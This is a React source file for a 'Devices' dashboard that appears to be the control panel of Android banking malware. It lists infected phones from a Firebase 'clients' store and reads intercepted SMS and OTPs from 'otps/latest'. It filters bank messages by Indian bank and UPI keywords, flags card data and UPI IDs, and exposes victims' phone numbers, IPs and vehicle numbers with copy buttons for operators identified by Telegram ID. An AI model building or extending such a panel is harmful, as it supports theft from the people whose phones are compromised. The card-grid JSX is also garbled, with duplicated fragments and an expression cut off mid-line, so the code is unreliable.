import { useEffect, useState, useMemo } from 'react';
import { db } from '@/lib/firebase';
import { ref, onValue, set, remove } from 'firebase/database';
import { Link } from 'wouter';
import {
  Search, Smartphone, Battery, BatteryWarning, Pin, PinOff, Activity,
  ChevronRight, Wifi, Cpu, HardDrive, Radio, Terminal, ShieldCheck, Gauge, Table2, LayoutGrid as GridIcon, CreditCard, IndianRupee, Signal, Copy,
} from 'lucide-react';
import { Layout } from '@/components/layout';

const BANK_SMS_KEYS =
  /bank|hdfc|sbi|icici|axis|kotak|bob|union|pnb|upi|paytm|phonepe|gpay|google pay|bhim|net banking|atm|withdraw|credit|debit|transaction|credited|debited/i;
import { useAuth } from '@/lib/auth';
import { normalizeDevice, type NormalizedDevice } from '@/lib/normalizeDevice';

export function Dashboard() {
  const { isAdmin, userId } = useAuth();
  const [devices, setDevices] = useState<NormalizedDevice[]>([]);
  const [loading, setLoading] = useState(true);
  const [search, setSearch] = useState('');
  const [pinnedIds, setPinnedIds] = useState<Set<string>>(new Set());
  const [bankSmsCount, setBankSmsCount] = useState(0);
  const [view, setView] = useState<'grid' | 'table'>('grid');
  const [filter, setFilter] = useState<'all' | 'online' | 'offline' | 'pinned' | 'upi' | 'cards' | 'bank'>('all');
  const [sortMode, setSortMode] = useState<'newest' | 'oldest' | 'name' | 'battery'>('newest');

  useEffect(() => {
    const clientsRef = ref(db, 'clients');
    const unsubscribe = onValue(clientsRef, (snapshot) => {
      if (snapshot.exists()) {
        const data = snapshot.val();
        const devicesList = Object.keys(data).map((key) =>
          normalizeDevice(key, data[key])
        );
        setDevices(devicesList);
      } else {
        setDevices([]);
      }
      setLoading(false);
    });
    return () => unsubscribe();
  }, []);

  useEffect(() => {
    const bankRef = ref(db, 'otps/latest');
    const unsubBank = onValue(
      bankRef,
      (snapshot) => {
        if (!snapshot.exists()) { setBankSmsCount(0); return; }
        const records = Object.values(snapshot.val() as Record<string, { body?: string; service?: string }>);
        setBankSmsCount(records.filter((r) => BANK_SMS_KEYS.test(`${r.body || ''} ${r.service || ''}`)).length);
      },
      (err) => console.error('bank sms count:', err)
    );
    return () => unsubBank();
  }, []);

  useEffect(() => {
    if (!userId) return;
    const pinsRef = ref(db, `config/pins/${userId}`);
    const unsubscribe = onValue(pinsRef, (snapshot) => {
      if (snapshot.exists()) {
        const data = snapshot.val() as Record<string, boolean>;
        setPinnedIds(new Set(Object.keys(data).filter((k) => data[k])));
      } else {
        setPinnedIds(new Set());
      }
    });
    return () => unsubscribe();
  }, [userId]);

  const togglePin = (deviceId: string, e: React.MouseEvent) => {
    e.preventDefault();
    e.stopPropagation();
    if (!userId) return;
    const pinRef = ref(db, `config/pins/${userId}/${deviceId}`);
    if (pinnedIds.has(deviceId)) {
      remove(pinRef);
    } else {
      set(pinRef, true);
    }
  };

  const visibleDevices = useMemo(() => {
    if (isAdmin) return devices;
    return devices.filter((d) => d.ownerTelegramId === userId);
  }, [devices, isAdmin, userId]);

  const filteredDevices = useMemo(() => {
    const hasCards = (d: NormalizedDevice) =>
      Object.keys(d.raw).some((k) => k.startsWith('cc_') || k === 'cards' || k === 'cc');

    let base = search
      ? visibleDevices.filter((d) => {
          const q = search.toLowerCase();
          return (
            d.phone.toLowerCase().includes(q) ||
            d.model.toLowerCase().includes(q) ||
            d.upi.toLowerCase().includes(q) ||
            d.id.toLowerCase().includes(q) ||
            (d.ip_address || '').includes(q)
          );
        })
      : visibleDevices;

    switch (filter) {
      case 'online': base = base.filter((d) => d.isOnline); break;
      case 'offline': base = base.filter((d) => !d.isOnline); break;
      case 'pinned': base = base.filter((d) => pinnedIds.has(d.id)); break;
      case 'upi': base = base.filter((d) => d.upi); break;
      case 'cards': base = base.filter(hasCards); break;
      case 'bank': base = base.filter((d) => d.raw.smsCount > 0); break;
    }

    const sorted = [...base];
    const joinedOf = (d: NormalizedDevice) => {
      const j = Number(d.raw.joined || 0);
      return j || d.raw.ping || 0;
    };
    switch (sortMode) {
      case 'newest': sorted.sort((a, b) => joinedOf(b) - joinedOf(a)); break;
      case 'oldest': sorted.sort((a, b) => joinedOf(a) - joinedOf(b)); break;
      case 'name': sorted.sort((a, b) => a.model.localeCompare(b.model)); break;
      case 'battery': sorted.sort((a, b) => getBatteryValue(b.battery) - getBatteryValue(a.battery)); break;
    }

    return sorted.sort((a, b) => {
      const aPinned = pinnedIds.has(a.id) ? 0 : 1;
      const bPinned = pinnedIds.has(b.id) ? 0 : 1;
      if (aPinned !== bPinned) return aPinned - bPinned;
      return 0;
    });
  }, [visibleDevices, search, pinnedIds, filter, sortMode]);

  const getBatteryValue = (battery: string) => parseInt(battery.replace('%', ''), 10) || 0;

  // Fleet-health stats (from all devices visible to this user).
  const fleet = useMemo(() => {
    const hasCards = (d: NormalizedDevice) =>
      Object.keys(d.raw).some((k) => k.startsWith('cc_') || k === 'cards' || k === 'cc');
    const online = visibleDevices.filter((d) => d.isOnline).length;
    const offline = visibleDevices.filter((d) => !d.isOnline).length;
    const cards = visibleDevices.filter(hasCards).length;
    const upi = visibleDevices.filter((d) => d.upi).length;
    return { total: visibleDevices.length, online, offline, cards, upi, bank: bankSmsCount };
  }, [visibleDevices, bankSmsCount]);

  const healthCells = [
    {
      label: 'Total Devices', value: fleet.total, icon: Terminal, key: 'all' as const,
      accent: 'from-primary/25 to-primary/5 text-primary', glow: 'shadow-primary/30',
    },
    {
      label: 'Online', value: fleet.online, icon: Radio, key: 'online' as const,
      accent: 'from-success/25 to-success/5 text-success', glow: 'shadow-success/30',
    },
    {
      label: 'Offline', value: fleet.offline, icon: Gauge, key: 'offline' as const,
      accent: 'from-muted-foreground/20 to-muted-foreground/5 text-muted-foreground', glow: 'shadow-black/20',
    },
    {
      label: 'Bank SMS', value: fleet.bank, icon: IndianRupee, key: 'bank' as const,
      accent: 'from-warning/25 to-warning/5 text-warning', glow: 'shadow-warning/30',
    },
    {
      label: 'Cards', value: fleet.cards, icon: CreditCard, key: 'cards' as const,
      accent: 'from-accent/25 to-accent/5 text-accent', glow: 'shadow-accent/30',
    },
    {
      label: 'UPI IDs', value: fleet.upi, icon: Signal, key: 'upi' as const,
      accent: 'from-primary/15 to-primary/5 text-primary', glow: 'shadow-primary/20',
    },
  ];

  const jumpToDevices = () => {
    document.getElementById('devices-tools')?.scrollIntoView({ behavior: 'smooth', block: 'start' });
  };

  const batteryTone = (pct: number): 'danger' | 'warn' | 'good' =>
    pct <= 20 ? 'danger' : pct <= 50 ? 'warn' : 'good';

  // Static lookup so Tailwind sees literal class names (no dynamic concat).
  const ACCENT_VIA: Record<string, string> = {
    good: 'via-success/70',
    warn: 'via-warning/70',
    danger: 'via-warning/70',
    offline: 'via-muted-foreground/50',
  };
  const RING_STROKE: Record<string, string> = {
    good: 'stroke-success',
    warn: 'stroke-warning',
    danger: 'stroke-destructive',
  };

  const quickCopy = async (text: string, e: React.MouseEvent) => {
    e.preventDefault();
    e.stopPropagation();
    try {
      await navigator.clipboard.writeText(text);
    } catch { /* ignore */ }
  };

  return (
    <Layout>
      {/* ── Page header ── */}
      <div className="relative overflow-hidden rounded-3xl border border-card-border bg-gradient-to-br from-primary/10 via-card/60 to-accent/10 p-6 md:p-8 mb-6">
        <div
          className="absolute inset-0 opacity-[0.14] pointer-events-none"
          style={{
            backgroundImage:
              'linear-gradient(to right, hsl(var(--border)) 1px, transparent 1px), linear-gradient(to bottom, hsl(var(--border)) 1px, transparent 1px)',
            backgroundSize: '36px 36px',
          }}
        />
        <div className="absolute -top-20 -left-20 w-64 h-64 rounded-full bg-primary/20 blur-3xl pointer-events-none" />
        <div className="absolute -bottom-24 -right-16 w-72 h-72 rounded-full bg-accent/15 blur-3xl pointer-events-none" />
        <div className="relative flex flex-col gap-4">
          <div>
          <p className="page-eyebrow flex items-center gap-2">
            <Activity className="w-3 h-3 text-primary" /> Your devices
          </p>
          <h1 className="page-title text-3xl md:text-4xl">
            <span className="text-primary">Devices</span>
          </h1>
          <p className="text-sm text-muted-foreground mt-1.5 flex items-center gap-2 flex-wrap">
            <span className="inline-flex items-center gap-1.5">
              <span className="w-1.5 h-1.5 rounded-full bg-success animate-pulse shadow-[0_0_8px_2px] shadow-success/50" />
              {fleet.online} online right now
            </span>
            <span className="opacity-40">·</span>
            <span>{filteredDevices.length} shown</span>
            {pinnedIds.size > 0 && (
              <>
                <span className="opacity-40">·</span>
                <span className="text-primary">{pinnedIds.size} pinned</span>
              </>
            )}
          </p>
        </div>

        <div className="relative w-full md:w-96">
          <Search className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
          <input
            type="text"
            placeholder="Search phone, model, UPI, IP..."
            value={search}
            onChange={(e) => setSearch(e.target.value)}
            className="w-full bg-card/70 backdrop-blur border border-card-border rounded-xl py-3 pl-11 pr-4 text-sm text-foreground focus:outline-none focus:ring-2 focus:ring-primary/25 focus:border-primary/50 transition-all placeholder:text-muted-foreground font-mono"
          />
        </div>
        <div className="flex items-center gap-1.5 p-1 rounded-xl border border-card-border bg-card/70 backdrop-blur w-fit">
          <button
            onClick={() => setView('grid')}
            aria-label="Grid view"
            className={`flex items-center justify-center w-9 h-9 rounded-lg transition-all ${view === 'grid' ? 'bg-primary/15 text-primary' : 'text-muted-foreground hover:text-foreground'}`}
          >
            <GridIcon className="w-4 h-4" />
          </button>
          <button
            onClick={() => setView('table')}
            aria-label="Table view"
            className={`flex items-center justify-center w-9 h-9 rounded-lg transition-all ${view === 'table' ? 'bg-primary/15 text-primary' : 'text-muted-foreground hover:text-foreground'}`}
          >
            <Table2 className="w-4 h-4" />
          </button>
        </div>
        </div>
      </div>

      {/* ── Fleet-health instrument strip ── */}
      <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-6 gap-3 mb-6">
        {healthCells.map((c) => (
          <div
            key={c.label}
            onClick={() => { setFilter(c.key); jumpToDevices(); }}
            title={`Filter: ${c.label}`}
            className={`relative overflow-hidden rounded-2xl border bg-card/70 backdrop-blur p-4 flex items-center gap-3.5 transition-all group cursor-pointer ${
              filter === c.key ? 'border-primary/60 ring-1 ring-primary/40' : 'border-card-border hover:border-primary/40'
            }`}
          >
            <div className={`absolute -top-10 -right-10 w-28 h-28 rounded-full bg-gradient-to-br ${c.accent} blur-2xl opacity-60 group-hover:opacity-100 transition-opacity`} />
            <div className={`relative flex items-center justify-center w-11 h-11 rounded-xl bg-gradient-to-br ${c.accent} shadow-lg ${c.glow}`}>
              <c.icon className="w-5 h-5" />
            </div>
            <div className="relative flex flex-col leading-tight">
              <span className="page-eyebrow">{c.label}</span>
              <span className="font-mono text-3xl font-bold tracking-tight text-foreground tabular-nums">
                {String(c.value).padStart(2, '0')}
              </span>
            </div>
          </div>
        ))}
      </div>

      {/* ── Mythos-style filter chips + sort ── */}
      <div id="devices-tools" className="flex flex-wrap items-center gap-2 mb-6">
        <div className="flex flex-wrap gap-1.5 p-1 rounded-xl border border-card-border bg-card/70 backdrop-blur">
          {([
            ['all', 'All'],
            ['online', 'Online'],
            ['offline', 'Offline'],
            ['pinned', 'Pinned'],
            ['upi', 'UPI'],
            ['cards', 'Cards'],
            ['bank', 'Bank SMS'],
          ] as const).map(([key, label]) => (
            <button
              key={key}
              onClick={() => setFilter(key)}
              className={`px-3 py-1.5 rounded-lg text-xs font-semibold transition-all ${
                filter === key
                  ? 'bg-primary text-primary-foreground shadow-md shadow-primary/25'
                  : 'text-muted-foreground hover:text-foreground hover:bg-muted'
              }`}
            >
              {label}
            </button>
          ))}
        </div>
        <select
          value={sortMode}
          onChange={(e) => setSortMode(e.target.value as any)}
          className="h-9 px-3 rounded-xl border border-card-border bg-card/70 backdrop-blur text-xs font-semibold text-muted-foreground focus:outline-none focus:ring-2 focus:ring-primary/40 cursor-pointer"
        >
          <option value="newest">Newest</option>
          <option value="oldest">Oldest</option>
          <option value="name">Name</option>
          <option value="battery">Battery</option>
        </select>
      </div>

      {loading ? (
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-4">
          {[1, 2, 3, 4, 5, 6, 7, 8].map((i) => (
            <div key={i} className="relative overflow-hidden rounded-2xl border border-card-border bg-card/60 h-52">
              <div className="absolute inset-0 bg-gradient-to-r from-transparent via-primary/5 to-transparent animate-pulse" />
            </div>
          ))}
        </div>
      ) : filteredDevices.length === 0 ? (
        <div className="relative overflow-hidden rounded-2xl border border-dashed border-card-border flex flex-col items-center justify-center py-24 px-4 text-center bg-card/40">
          <div className="absolute -top-20 left-1/2 -translate-x-1/2 w-72 h-72 rounded-full bg-primary/10 blur-3xl" />
          <div className="relative w-16 h-16 rounded-2xl bg-gradient-to-br from-primary/20 to-accent/10 flex items-center justify-center mb-4 ring-1 ring-primary/20">
            <Smartphone className="w-8 h-8 text-primary" />
          </div>
          <h3 className="font-display text-lg font-semibold text-foreground mb-1">No devices found</h3>
          <p className="text-sm text-muted-foreground max-w-sm">
            {search
              ? 'Adjust your search query to find active devices.'
              : isAdmin
              ? "No devices yet — they'll show up here the moment one connects."
              : 'No devices are assigned to your account yet. Contact admin.'}
          </p>
        </div>
      ) : view === 'table' ? (
        <div className="overflow-x-auto rounded-2xl border border-card-border bg-card/70 backdrop-blur">
          <table className="w-full min-w-[720px] text-sm">
            <thead>
              <tr className="border-b border-card-border text-left">
                <th className="page-eyebrow px-4 py-3">#</th>
                <th className="page-eyebrow px-4 py-3">Device</th>
                <th className="page-eyebrow px-4 py-3">Phone</th>
                <th className="page-eyebrow px-4 py-3">Network</th>
                <th className="page-eyebrow px-4 py-3">UPI / Android</th>
                <th className="page-eyebrow px-4 py-3">Battery</th>
                <th className="page-eyebrow px-4 py-3">Status</th>
                {isAdmin && <th className="page-eyebrow px-4 py-3">Owner</th>}
                <th className="px-4 py-3" />
              </tr>
            </thead>
            <tbody>
              {filteredDevices.map((device, i) => {
                const batteryNum = getBatteryValue(device.battery);
                const isPinned = pinnedIds.has(device.id);
                const online = device.isOnline;
                const tone = batteryTone(batteryNum);
                const segs = Math.max(1, Math.ceil(batteryNum / 20));
                const segClass = tone === 'danger' || tone === 'warn' ? 'bg-warning' : 'bg-success';
                return (
                  <tr
                    key={device.id}
                    className={`border-b border-card-border last:border-0 hover:bg-muted/50 transition-colors cursor-pointer ${isPinned ? 'bg-primary/5' : ''}`}
                    onClick={() => (window.location.href = `/device/${device.id}`)}
                  >
                    <td className="px-4 py-3 font-mono text-xs text-muted-foreground">
                      {isPinned ? '📌' : String(i + 1).padStart(2, '0')}
                    </td>
                    <td className="px-4 py-3">
                      <span className="font-display font-semibold">{device.model}</span>
                    </td>
                    <td className="px-4 py-3">
                      <span className="flex items-center gap-1.5 min-w-0 group/phone">
                        <span className="font-mono text-xs font-semibold truncate max-w-[7.5rem]">{device.phone || '—'}</span>
                        {device.phone && (
                          <button
                            onClick={(e) => { e.stopPropagation(); quickCopy(device.phone, e); }}
                            title="Copy number"
                            className="opacity-0 group-hover/phone:opacity-100 transition-opacity text-muted-foreground hover:text-primary p-0.5"
                          >
                            <Copy className="w-3 h-3" />
                          </button>
                        )}
                      </span>
                    </td>
                    <td className="px-4 py-3">
                      <span className="inline-flex items-center gap-1 font-mono text-[10px] text-muted-foreground bg-muted/60 px-1.5 py-0.5 rounded-md border border-card-border max-w-[7rem] truncate">
                        <Signal className="w-2.5 h-2.5 text-primary/70 shrink-0" />
                        {device.raw.service_provider || '—'}
                      </span>
                    </td>
                    <td className="px-4 py-3">
                      <span className="flex items-center gap-1.5 min-w-0 group/upi">
                        <span className="font-mono text-xs truncate max-w-[7rem]">{device.upi ? <span className="text-primary">{device.upi}</span> : device.androidV ? `v${device.androidV}` : '—'}</span>
                        {device.upi && (
                          <button
                            onClick={(e) => { e.stopPropagation(); quickCopy(device.upi, e); }}
                            title="Copy UPI"
                            className="opacity-0 group-hover/upi:opacity-100 transition-opacity text-muted-foreground hover:text-primary p-0.5"
                          >
                            <Copy className="w-3 h-3" />
                          </button>
                        )}
                      </span>
                    </td>
                    <td className="px-4 py-3">
                      <div className="flex items-center gap-2">
                        <div className="flex items-center gap-0.5 w-16">
                          {[0, 1, 2, 3, 4].map((x) => (
                            <span key={x} className={`h-1.5 rounded-sm flex-1 ${x < segs ? (online ? segClass + ' animate-pulse' : segClass) : 'bg-border'}`} style={{ animationDelay: `${x * 120}ms` }} />
                          ))}
                        </div>
                        <span className={`font-mono text-[10px] font-bold ${batteryNum <= 20 ? 'text-warning' : 'text-muted-foreground'}`}>
                          {device.battery || '—'}
                        </span>
                      </div>
                    </td>
                    <td className="px-4 py-3">
                      <span className={`inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-[11px] font-bold ${
                        online ? 'bg-success/10 text-success' : 'bg-muted/60 text-muted-foreground'
                      }`}>
                        <span className={`w-1.5 h-1.5 rounded-full ${online ? 'bg-success animate-pulse' : 'bg-muted-foreground'}`} />
                        {online ? 'Online' : 'Offline'}
                      </span>
                    </td>
                    {isAdmin && (
                      <td className="px-4 py-3 font-mono text-[10px] text-muted-foreground">
                        {device.ownerTelegramId ? device.ownerTelegramId.slice(0, 8) + '…' : '—'}
                      </td>
                    )}
                    <td className="px-4 py-3 text-right">
                      <ChevronRight className="w-4 h-4 text-muted-foreground inline" />
                    </td>
                  </tr>
                );
              })}
            </tbody>
          </table>
        </div>
      ) : (
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-4 animate-in fade-in slide-in-from-bottom-4 duration-500 fill-mode-both">
          {filteredDevices.map((device, i) => {
            const batteryNum = getBatteryValue(device.battery);
            const isPinned = pinnedIds.has(device.id);
            const online = device.isOnline;
            const tone = batteryTone(batteryNum);
            const toneColor = online
              ? tone === 'danger'
                ? 'warning'
                : tone === 'warn'
                ? 'warning'
                : 'success'
              : 'muted-foreground';
            const viaClass = online ? ACCENT_VIA[tone] : ACCENT_VIA.offline;
            const segs = Math.max(1, Math.ceil(batteryNum / 20));
            const segColors = ['bg-success', 'bg-success', 'bg-success', 'bg-success', 'bg-success'];
            if (tone === 'danger') segColors.fill('bg-warning');
            else if (tone === 'warn') { segColors[4] = 'bg-warning'; segColors[3] = 'bg-warning'; }

            return (
              <Link
                key={device.id}
                href={`/device/${device.id}`}
                className={`group relative overflow-hidden rounded-2xl border bg-card/70 backdrop-blur p-4 flex flex-col transition-all duration-300 hover:-translate-y-1 hover:shadow-2xl ${
                  isPinned
                    ? 'border-primary/50 shadow-lg shadow-primary/10'
                    : 'border-card-border hover:border-primary/40 hover:shadow-primary/10'
                }`}
                style={{ animationDelay: `${i * 50}ms` }}
              >
                {/* Top accent line + ambient glow */}
                <span className={`absolute inset-x-0 top-0 h-px bg-gradient-to-r from-transparent ${viaClass} to-transparent`} />
                {online && <span className="card-scan" />}
                <span className={`absolute -top-14 -right-14 w-36 h-36 rounded-full blur-3xl ${online ? 'bg-success/10' : 'bg-muted-foreground/5'} group-hover:scale-125 transition-transform duration-500`} />
                {isPinned && (
                  <span className="absolute top-0 right-0 w-16 h-16 bg-gradient-to-bl from-primary/20 to-transparent" />
                )}

                {/* Header row — Mythos: model + device id */}
                <div className="relative flex justify-between items-start mb-3">
                  <div className="min-w-0">
                    <h3 className="font-display font-semibold text-sm truncate max-w-[10rem] group-hover:text-primary transition-colors" title={device.model}>
                      {device.model}
                    </h3>
                    <p className="font-mono text-[10px] text-muted-foreground truncate max-w-[10rem] mt-0.5" title={device.id}>
                      {device.id.slice(0, 16)}
                    </p>
                  </div>

                  <div className="flex items-center gap-1.5 shrink-0">
                    {device.battery && (
                      <div className={`relative w-11 h-11 ${online ? 'ring-live' : ''}`} title={`Battery ${device.battery}`}>
                        <svg viewBox="0 0 36 36" className="w-11 h-11 -rotate-90">
                          <circle cx="18" cy="18" r="15.5" fill="none" strokeWidth="3.5" className="stroke-border" />
                          <circle
                            cx="18" cy="18" r="15.5" fill="none" strokeWidth="3.5" strokeLinecap="round"
                            strokeDasharray={`${2 * Math.PI * 15.5}`}
                            strokeDashoffset={`${2 * Math.PI * 15.5 * (1 - Math.min(100, Math.max(0, batteryNum)) / 100)}`}
                            className={`${RING_STROKE[tone]} transition-all duration-700`}
                          />
                        </svg>
                        <span className="absolute inset-0 flex items-center justify-center font-mono text-[9px] font-bold">
                          {batteryNum}%
                        </span>
                      </div>
                    )}
                    <button
                      onClick={(e) => togglePin(device.id, e)}
                      title={isPinned ? 'Unpin' : 'Pin to top'}
                      aria-label={isPinned ? 'Unpin' : 'Pin to top'}
                      className={`p-2 rounded-full transition-all ${
                        isPinned
                          ? 'bg-primary/15 text-primary shadow-lg shadow-primary/20'
                          : 'text-muted-foreground hover:text-foreground active:bg-muted'
                      }`}
                    >
                      {isPinned ? <PinOff className="w-4 h-4" /> : <Pin className="w-4 h-4" />}
                    </button>

                  <div className="flex items-center gap-1">
                    <button
                      onClick={(e) => togglePin(device.id, e)}
                      title={isPinned ? 'Unpin' : 'Pin to top'}
                      className={`p-2 rounded-full transition-all ${
                        isPinned
                          ? 'bg-[#7c3aed]/10 text-[#7c3aed] opacity-100'
                          : 'opacity-0 group-hover:opacity-100 text-[#6b5b7d] hover:text-[#7c3aed] hover:bg-[#f5efff]'
                      }`}
                    >
                      {isPinned ? <PinOff className="w-3.5 h-3.5" /> : <Pin className="w-3.5 h-3.5" />}
                    </button>

                    <span className={`inline-flex items-center gap-1 px-2.5 py-1 rounded-full text-xs font-semibold ${
                      device.isOnline
                        ? 'bg-[#10b981]/10 text-[#10b981]'
                        : 'bg-[#9ca3af]/20 text-[#6b5b7d]'
                    }`}>
                      <span className={`w-1.5 h-1.5 rounded-full ${device.isOnline ? 'bg-[#10b981] animate-pulse' : 'bg-[#9ca3af]'}`} />
                      {device.isOnline ? 'Online' : 'Offline'}
                    </span>
                  </div>
                </div>

                <div className="grid grid-cols-2 gap-y-3 gap-x-2 text-sm mt-auto">
                  <div className="flex flex-col">
                    <span className="text-[10px] text-[#6b5b7d] uppercase tracking-wider font-medium">Phone</span>
                    <span className="font-medium text-xs text-[#2d1b4e]">{device.phone || 'N/A'}</span>
                  </div>
                  {device.vehicleNumber && (
                    <div className="flex flex-col col-span-2">
                      <span className="text-[10px] text-amber-600 dark:text-amber-400 uppercase tracking-wider font-medium">Vehicle</span>
                      <span className="font-mono font-semibold text-xs text-amber-700 dark:text-amber-300 truncate">{device.vehicleNumber}</span>
                    </div>
                  )}
                  <div className="flex flex-col">
                    {device.upi ? (
                      <>
                        <span className="text-[10px] text-[#6b5b7d] uppercase tracking-wider font-medium">UPI</span>
                        <span className="font-medium text-xs text-[#7c3aed] truncate">{device.upi}</span>
                      </>
                    ) : device.androidV ? (
                      <>
                        <span className="text-[10px] text-[#6b5b7d] uppercase tracking-wider font-medium">Android</span>
                        <span className="font-medium text-xs text-[#2d1b4e]">v{device.androidV}</span>
                      </>
                    ) : (
                      <>
                        <span className="text-[10px] text-[#6b5b7d] uppercase tracking-wider font-medium">UPI</span>
                        <span className="font-medium text-xs text-[#9ca3af]">N/A</span>
                      </>
                    )}
                  </div>
                </div>

                <div className="mt-4 pt-3 border-t border-[#d8c8f0] flex items-center justify-between">
                  <div className="flex items-center gap-3">
                    {device.battery && (
                      <div className="flex items-center gap-1 text-xs text-[#6b5b7d] font-medium">
                        {batteryNum <= 20 ? (
                          <BatteryWarning className="w-3.5 h-3.5 text-[#f59e0b]" />
                    <div className="grid grid-cols-2 gap-y-4 gap-x-2 text-sm mt-auto">
                      <div className="flex flex-col">
                        <span className="text-[10px] text-muted-foreground uppercase tracking-wider font-medium">Phone</span>
                        <span className="font-medium text-xs text-foreground mt-0.5">{device.phone || 'N/A'}</span>
                      </div>
                      <div className="flex flex-col">
                        {device.upi ? (
                          <>
                            <span className="text-[10px] text-muted-foreground uppercase tracking-wider font-medium">UPI</span>
                            <span className="font-medium text-xs text-[#a78bfa] truncate mt-0.5">{device.upi}</span>
                          </>
                        ) : device.androidV ? (
                          <>
                            <span className="text-[10px] text-muted-foreground uppercase tracking-wider font-medium">Android</span>
                            <span className="font-medium text-xs text-foreground mt-0.5">v{device.androidV}</span>
                          </>
                        ) : (
                          <>
                            <span className="text-[10px] text-muted-foreground uppercase tracking-wider font-medium">UPI</span>
                            <span className="font-medium text-xs text-muted-foreground/50 mt-0.5">N/A</span>
                          </>
                        )}
                      </div>
                    </div>
                    <span className={`inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-[11px] font-bold tracking-wide ${
                      online
                        ? 'bg-success/10 text-success border border-success/20 shadow-[0_0_12px_-2px] shadow-success/40'
                        : 'bg-muted/60 text-muted-foreground border border-card-border'
                    }`}>
                      <span className={`w-1.5 h-1.5 rounded-full ${online ? 'bg-success animate-pulse' : 'bg-muted-foreground'}`} />
                      {online ? 'LIVE' : 'OFFLINE'}
                    </span>
                  </div>
                </div>

                {/* Mythos-style two-column stats */}
                <div className="relative grid grid-cols-2 gap-y-3 gap-x-2 text-sm">
                  <div className="flex flex-col">
                    <span className="page-eyebrow">Android</span>
                    <span className="font-mono font-medium text-xs text-foreground truncate">
                      {device.androidV ? `v${device.androidV}` : '—'}
                    </span>
                  </div>
                  <div className="flex flex-col">
                    <span className="page-eyebrow">Battery</span>
                    <span className={`font-mono font-medium text-xs truncate ${batteryNum <= 20 ? 'text-warning' : 'text-foreground'}`}>
                      {device.battery || '—'}
                    </span>
                  </div>
                  <div className="flex flex-col">
                    <span className="page-eyebrow">Number</span>
                    <span className="flex items-center gap-1 min-w-0">
                      <span className="font-mono font-semibold text-xs text-foreground truncate group-hover:text-primary transition-colors">
                        {device.phone || 'Unknown'}
                      </span>
                      {device.phone && (
                        <button
                          onClick={(e) => quickCopy(device.phone, e)}
                          title="Copy number"
                          className="opacity-0 group-hover:opacity-100 transition-opacity p-0.5 text-muted-foreground hover:text-primary shrink-0"
                        >
                          <Copy className="w-3 h-3" />
                        </button>
                      )}
                    </span>

                  </div>
                  <div className="flex flex-col">
                    <span className="page-eyebrow">Vehicle</span>
                    <span className="font-mono font-medium text-xs truncate flex items-center gap-1">{device.vehicleNumber ? <span className="text-amber-600 dark:text-amber-400 font-semibold">{device.vehicleNumber}</span> : <span className="text-muted-foreground">—</span>}{device.vehicleNumber && <button onClick={(e) => quickCopy(device.vehicleNumber, e)} className="opacity-0 group-hover:opacity-100 transition-opacity"><Copy className="w-3 h-3 text-muted-foreground" /></button>}</span>
                  </div>
                  <div className="flex flex-col">
                    <span className="page-eyebrow">Network</span>
                    <span className="font-mono font-medium text-xs text-muted-foreground truncate">
                      {device.raw.service_provider || (device.upi ? device.upi : '—')}
                    </span>
                  </div>
                </div>

                {/* Spec chips */}
                <div className="relative mt-3.5 flex items-center gap-1.5 flex-wrap">
                  {device.androidV && (
                    <span className="inline-flex items-center gap-1 font-mono text-[10px] font-medium text-muted-foreground bg-muted/60 px-1.5 py-0.5 rounded-md border border-card-border">
                      <Terminal className="w-2.5 h-2.5 text-primary/70" /> A{device.androidV}
                    </span>
                  )}
                  {device.cpu_arch && (
                    <span className="inline-flex items-center gap-1 font-mono text-[10px] font-medium text-muted-foreground bg-muted/60 px-1.5 py-0.5 rounded-md border border-card-border">
                      <Cpu className="w-2.5 h-2.5 text-primary/70" /> {device.cpu_arch.slice(0, 10)}
                    </span>
                  )}
                  {device.storage && (
                    <span className="inline-flex items-center gap-1 font-mono text-[10px] font-medium text-muted-foreground bg-muted/60 px-1.5 py-0.5 rounded-md border border-card-border">
                      <HardDrive className="w-2.5 h-2.5 text-primary/70" /> {device.storage}
                    </span>
                  )}
                  {device.raw.service_provider && (
                    <span className="inline-flex items-center gap-1 font-mono text-[10px] font-medium text-muted-foreground bg-muted/60 px-1.5 py-0.5 rounded-md border border-card-border">
                      <Signal className="w-2.5 h-2.5 text-primary/70" /> {device.raw.service_provider}
                    </span>
                  )}
                  {device.ip_address && (
                    <span className="inline-flex items-center gap-1 font-mono text-[10px] font-medium text-muted-foreground bg-muted/60 px-1.5 py-0.5 rounded-md border border-card-border">
                      <Wifi className="w-2.5 h-2.5 text-primary/70" />
                      {device.ip_address.split('.').slice(0, 2).join('.')}…
                    </span>
                  )}
                  {device.ownerTelegramId && isAdmin && (
                    <span className="inline-flex items-center gap-1 font-mono text-[10px] font-medium text-muted-foreground bg-muted/60 px-1.5 py-0.5 rounded-md border border-card-border">
                      <ShieldCheck className="w-2.5 h-2.5 text-primary/70" /> {device.ownerTelegramId.slice(0, 8)}…
                    </span>
                  )}
                </div>

                {/* Footer: UPI / storage + chevron */}
                <div className="relative mt-4 pt-3 border-t border-card-border flex items-center justify-between gap-3">
                  <div className="flex items-center gap-2 flex-1 min-w-0">
                    {device.upi ? (
                      <>
                        <span className="page-eyebrow shrink-0">UPI</span>
                        <span className="font-mono text-[11px] font-semibold text-primary truncate">{device.upi}</span>
                        <button
                          onClick={(e) => quickCopy(device.upi, e)}
                          title="Copy UPI"
                          className="opacity-0 group-hover:opacity-100 transition-opacity p-0.5 text-muted-foreground hover:text-primary shrink-0"
                        >
                          <Copy className="w-3 h-3" />
                        </button>
                      </>
                    ) : device.storage ? (
                      <span className="font-mono text-[10px] font-medium text-muted-foreground truncate">
                        <HardDrive className="w-3 h-3 inline mr-1 text-primary/60" />
                        {device.storage}
                      </span>
                    ) : (
                      <span className="page-eyebrow">No card data</span>
                    )}
                  </div>
                  <ChevronRight className="w-4 h-4 text-muted-foreground group-hover:text-primary transition-all group-hover:translate-x-1 shrink-0" />
                </div>
              </Link>
            );
          })}
        </div>
      )}
    </Layout>
  );
}